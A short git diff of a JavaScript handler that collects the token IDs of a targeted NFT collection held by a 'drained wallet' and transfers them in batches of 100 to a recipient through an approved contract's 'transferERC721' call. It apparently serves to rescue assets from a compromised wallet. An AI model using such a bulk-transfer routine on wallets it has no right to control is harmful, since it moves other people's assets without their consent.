@@ -28,13 +28,16 @@ try {
   else console.log('contract is approved to send nfts');
   
   const owners = await nftContract.erc721.getAllOwners();
+
+  // Get all the tokenIds of the targeted collection in the drained wallet
   const allTokenIds = owners.filter((item) => item.owner === _tokenOwner).map((item) => item.tokenId);
+  
   // Due to block space limit, we only send a few hundred per batch (tweak the number til it works for u)
-  const magicNumber = 10;
+  const magicNumber = 100;
   const _tokenIds = allTokenIds.length <= magicNumber ? allTokenIds : allTokenIds.slice(0, magicNumber);
 
   // Start migrating
-  const data = await migrateContract.call('migrate', [_tokenAddress, _tokenOwner, _recipient, _tokenIds]);
+  const data = await migrateContract.call('transferERC721', [_tokenAddress, _tokenOwner, _recipient, _tokenIds]);
   return res.send(data);
   return res.send(_tokenIds);
 } catch (err) {
